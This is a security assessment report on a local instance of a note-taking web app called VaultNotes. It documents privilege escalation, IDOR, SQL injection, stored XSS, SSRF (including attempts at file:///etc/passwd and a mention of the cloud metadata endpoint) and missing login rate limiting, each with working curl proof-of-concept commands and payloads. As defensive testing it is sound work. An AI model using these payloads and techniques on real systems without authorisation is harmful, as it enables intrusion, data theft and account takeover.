# VaultNotes — Black-Box Security Assessment (In Progress)

**Tester:** [your name]
**Date:** September 2026
**Scope:** VaultNotes v1 (local instance, http://127.0.0.1:5000)
**Method:** Black-box testing via curl, using seed accounts `alice`, `bob`, and self-registered accounts. No source code was consulted for the findings below — all were discovered purely through interacting with the running application.

---

## Summary

| # | Finding | Category (OWASP) | Severity |
|---|---|---|---|
| 1 | Privilege Escalation via Mass Assignment | Broken Access Control | High |
| 2 | Stale Session Authorization | Broken Access Control | Low–Medium |
| 3 | Insecure Direct Object Reference (IDOR) on notes | Broken Access Control | High |
| 4 | SQL Injection in search | Injection | High |
| 5 | Stored Cross-Site Scripting (XSS) in note content | Injection | High |
| 6 | Server-Side Request Forgery (SSRF) via link preview | SSRF | Medium–High |
| 7 | Broken Authentication — no login rate limiting | Broken Authentication | Medium |

Root cause analysis (exact vulnerable code/lines) is deferred to the white-box phase of this assessment. This document covers black-box discovery and proof-of-concept only.

---

## Finding 1: Privilege Escalation via Mass Assignment

**Severity:** High

**Description**
The registration form (`/register`) only exposes `username`, `email`, and `password` fields in the rendered HTML. However, the endpoint accepts an additional, undocumented `is_admin` parameter in the POST body. Submitting this field with a value of `1` grants the newly created account administrator privileges, despite no such option being presented to normal users.

**Proof of Concept**

```
curl -i -c cookies.txt -X POST http://127.0.0.1:5000/register \
  -d "username=eve" \
  -d "email=eva@test.com" \
  -d "password=Hello12345!" \
  -d "is_admin=1"
```

Response: `302 FOUND`, account created successfully.

Verified against the database directly:

```
sqlite3 vaultnotes.db "SELECT id, username, is_admin FROM users WHERE username='eve';"
```

Result: `6|eve|1`

**Impact**
Any unauthenticated user can create a fully-privileged administrator account with no vetting or approval step, simply by adding one extra field to a standard registration request. This provides full access to the admin dashboard (all users, all notes, ability to delete either).

**Notes**
This is a classic mass-assignment vulnerability — the server trusts all fields present in the request body rather than only the fields it intends to accept.

---

## Finding 2: Stale Session Authorization

**Severity:** Low–Medium (compounding issue, not independently exploitable)

**Description**
Admin status appears to be evaluated and stored in the session at **login time**, rather than being re-checked against the database on each request. Immediately after Finding 1's registration request (which sets a session cookie as part of account creation), attempting to access `/admin` with that same session redirected away rather than granting access — even though `is_admin=1` was already present in the database for that account.

Access was only granted after a **fresh login** with the same credentials, which caused the admin flag to be (re)populated into the session.

**Proof of Concept**

```
# Immediately after registration (Finding 1), using the registration session:
curl -b cookies.txt http://127.0.0.1:5000/admin
# -> redirected to "/", NOT granted access, despite is_admin=1 in the DB

# After a fresh login:
curl -c cookies2.txt -X POST http://127.0.0.1:5000/login \
  -d "username=eve" -d "password=Hello12345!"
curl -b cookies2.txt http://127.0.0.1:5000/admin
# -> admin dashboard returned successfully
```

**Impact**
On its own, this is a minor inconsistency. Combined with Finding 1, it means privilege escalation requires one extra step (a fresh login) to take effect — worth noting since it affects how an attacker would actually exploit Finding 1 end-to-end, and it also implies that de-escalating a user's privileges would not take effect for any of their already-active sessions either.

---

## Finding 3: Insecure Direct Object Reference (IDOR) on Notes

**Severity:** High

**Description**
Notes are retrieved, edited, and deleted using a numeric ID in the URL path (`/notes/<id>`, `/notes/<id>/edit`, `/notes/<id>/delete`), with no verification that the requesting user is the owner of the note (or that the note is public, in the case of viewing). Any authenticated user can view, modify, or delete any other user's notes — including private ones — simply by knowing or guessing the note ID.

**Proof of Concept**

```
# 1. Log in as alice, create a private note
curl -c alice_cookies.txt -X POST http://127.0.0.1:5000/login \
  -d "username=alice" -d "password=AlicePass123!"

curl -b alice_cookies.txt -X POST http://127.0.0.1:5000/notes/new \
  -d "title=Alice Secret" -d "content=This should not be visible to bob"

# 2. Confirm note ID and ownership
sqlite3 vaultnotes.db "SELECT id, owner_id, title, is_public FROM notes WHERE title='Alice Secret';"
# -> e.g. 4|2|Alice Secret|0   (private, owned by alice/user id 2)

# 3. Log in as bob (a different, unrelated user)
curl -c bob_cookies.txt -X POST http://127.0.0.1:5000/login \
  -d "username=bob" -d "password=BobPass123!"

# 4. View alice's private note as bob
curl -b bob_cookies.txt http://127.0.0.1:5000/notes/4
# -> 200 OK, full title and content returned, including "This should not be visible to bob"

# 5. Edit alice's note as bob
curl -b bob_cookies.txt -X POST http://127.0.0.1:5000/notes/4/edit \
  -d "title=Hacked by bob" -d "content=pwned"
# -> note content changed in the database, confirmed via sqlite3 query
```

**Impact**
Complete breakdown of the private/public note distinction. Any authenticated user — including a brand-new, unprivileged account — can read, modify, or destroy any other user's data, including content the owner explicitly marked private. Since note IDs are sequential integers, an attacker doesn't even need to guess; they can simply enumerate them.

---

## Finding 4: SQL Injection in Search

**Severity:** High

**Description**
The `/search` endpoint accepts a `q` query parameter and uses it to filter notes by title/content. User input is concatenated directly into the underlying SQL query rather than passed as a parameterized value, allowing an attacker to alter the query's logic and retrieve data that should not match the search term — including notes not owned by the requesting user.

**Discovery process**
An initial payload of a single quote (`q=x'`) produced a database error (`sqlite3.OperationalError: unrecognized token`), indicating that input was being inserted directly into SQL syntax rather than being treated as an inert string. The error message revealed that the application wraps the search term in a `LIKE '%...%'` pattern before executing the query, which informed the construction of a working payload: injected conditions using `=` were silently defeated by the trailing `%` (since `%` is a literal character in `=` comparisons, not a wildcard), but a condition using `LIKE` succeeded, since `%` is a wildcard in that context.

**Proof of Concept**

```
curl -b alice_cookies.txt -G http://127.0.0.1:5000/search \
  --data-urlencode "q=x' OR '1' LIKE '1"
```

Result: every note in the database was returned — including notes owned by other users and notes that share no relationship to the search term "x" — confirming the injected `OR` condition overrode the intended filter entirely.

**Impact**
An attacker can retrieve the full contents of the notes table regardless of ownership or public/private status, bypassing both the search filter and the access-control logic that is supposed to separate "my notes" from "public notes." This is a more serious framing than "broken search" — it is effectively another route to the same data exposure demonstrated in Finding 3 (IDOR), achieved through a completely different mechanism. Depending on the underlying query construction, similar injection could plausibly be extended to modify or delete data as well, though this was not tested here.

---

## Finding 5: Stored Cross-Site Scripting (XSS) in Note Content

**Severity:** High

**Description**
Note content is rendered back to users without sanitization or output encoding. Submitting HTML/JavaScript as note content causes that markup to be stored as-is and later rendered verbatim in the page shown to any user who views the note — including other users, since the note can be marked public.

**Proof of Concept**

```
curl -b alice_cookies.txt -X POST http://127.0.0.1:5000/notes/new \
  --data-urlencode "title=XSS Test" \
  --data-urlencode "content=<script>alert(1)</script>" \
  -d "is_public=on"
```

Fetching the dashboard afterward returned the payload unescaped in the raw HTML:

```html
<p><script>alert(1)</script></p>
```

Confirmed in a real browser: viewing the dashboard executed the script and produced a genuine JavaScript alert popup.

**Impact**
This is a **stored** (not reflected) XSS vulnerability: the payload persists in the database and executes for every user who subsequently views the page containing it, not just the original submitter. Since the note was marked public, this would trigger for any authenticated user — including administrators — who visits the dashboard. A real attacker could replace the proof-of-concept `alert(1)` with a payload that exfiltrates session cookies or performs actions on behalf of the victim (e.g. silently promoting the attacker's account to admin, using the same mechanism as Finding 1), making this a plausible path to full account or admin takeover rather than a cosmetic issue.

---

## Finding 6: Server-Side Request Forgery (SSRF) via Link Preview

**Severity:** Medium–High

**Description**
The `/notes/preview` endpoint accepts a `url` parameter and performs a server-side HTTP request to fetch that URL, returning a snippet of the response. The endpoint performs no validation on the destination host or scheme, and is not bound to any specific note or ownership context — it can be called directly by any authenticated user regardless of whether they are actually composing a note.

**Proof of Concept**

```
# Baseline - normal external URL
curl -b alice_cookies.txt -X POST http://127.0.0.1:5000/notes/preview \
  --data-urlencode "url=https://example.com"
# -> 200, returns page content as expected

# Server fetches its own internal admin route
curl -b alice_cookies.txt -X POST http://127.0.0.1:5000/notes/preview \
  --data-urlencode "url=http://127.0.0.1:5000/admin"
# -> 200, server successfully issued the internal request
# (returned the login page with "Admin access required", since the
#  server-side fetch carries no session/cookie of the calling user)

# localhost alias, same result
curl -b alice_cookies.txt -X POST http://127.0.0.1:5000/notes/preview \
  --data-urlencode "url=http://localhost:5000/"
# -> 200, internal request succeeded

# Non-http scheme
curl -b alice_cookies.txt -X POST http://127.0.0.1:5000/notes/preview \
  --data-urlencode "url=file:///etc/passwd"
# -> Error: "No connection adapters were found for 'file:///etc/passwd'"
# (rejected by the underlying HTTP library's scheme handling, not by
#  any validation in the application itself)
```

**Impact**
The server can be induced to make arbitrary outbound requests to internal addresses on behalf of any authenticated user, with no scheme or host allowlist. While this instance did not yield sensitive data (the only reachable internal target is the app's own login-gated admin route, and the server-side fetch carries no authenticated session), this is a structural vulnerability class that is significantly more dangerous in typical production/cloud deployments — for example, an app hosted on AWS/GCP/Azure with this same flaw could be used to reach the cloud metadata endpoint (`http://169.254.169.254/`), which frequently exposes instance credentials. The absence of any host/scheme validation means the application would carry this same risk if deployed in such an environment or placed behind other internal services.

**Notes**
The endpoint is also not tied to note ownership or even note existence — it can be invoked as a bare "fetch anything" primitive by any logged-in user, which widens who can trigger it beyond just the person actively composing a note.

---

## Finding 7: Broken Authentication — No Login Rate Limiting

**Severity:** Medium

**Description**
The `/login` endpoint does not implement any rate limiting, account lockout, delay, or CAPTCHA after repeated failed login attempts. Every failed attempt is handled identically regardless of how many prior failures occurred for the same account.

**Proof of Concept**

```
for /L %i in (1,1,20) do curl -s -o nul -w "%i: %%{http_code}\n" -X POST http://127.0.0.1:5000/login -d "username=alice" -d "password=wrongpass%i"
```

20 rapid, consecutive failed login attempts against the `alice` account all returned identical behavior (same error, same response time, no lockout triggered). Immediately following the loop, logging in with alice's correct password succeeded without any obstruction:

```bash
curl -i -X POST http://127.0.0.1:5000/login -d "username=alice" -d "password=AlicePass123!"
```

**Impact**
An attacker can run an unthrottled online brute-force or credential-stuffing attack against any known username with no friction. Combined with weak or reused passwords, this significantly increases the risk of account compromise, and provides no detective control (no lockout, no alerting) that would otherwise flag such an attack in progress.

---

## Next Steps

- [x] Confirm delete via the same IDOR path (view/edit already confirmed)
- [x] SQL Injection in search
- [x] Stored XSS in note content
- [x] SSRF testing (link preview feature)
- [x] Authentication testing (login rate limiting / brute-force resistance)
- [ ] White-box review to identify exact root cause (file/line) for each confirmed finding
- [ ] Remediation + re-test on `main` branch
